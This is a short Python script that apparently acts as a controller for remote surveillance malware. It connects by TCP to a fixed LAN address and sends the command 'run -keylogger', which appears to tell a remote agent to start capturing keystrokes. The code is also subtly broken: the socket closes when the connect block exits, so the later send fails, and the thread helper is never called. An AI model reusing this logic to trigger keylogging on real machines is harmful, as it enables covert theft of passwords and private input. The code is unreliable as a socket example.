import socket
import threading
def start_CLI_socket():
            t3 = threading.Thread(target=create_CLI_socket)
            t3.daemon = True
            t3.start()
            

def create_CLI_socket():
            global cli
            while True:
                try:    
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cli:
                        cli.connect(("192.168.0.103",12345))
                        print("Connected")
                        break
                except Exception as e: print(f"Thrown Exception CLI: {e}")
def s():
    print(type(cli))
    print(cli)
    cli.send(b"run -keylogger")                

create_CLI_socket()    

s()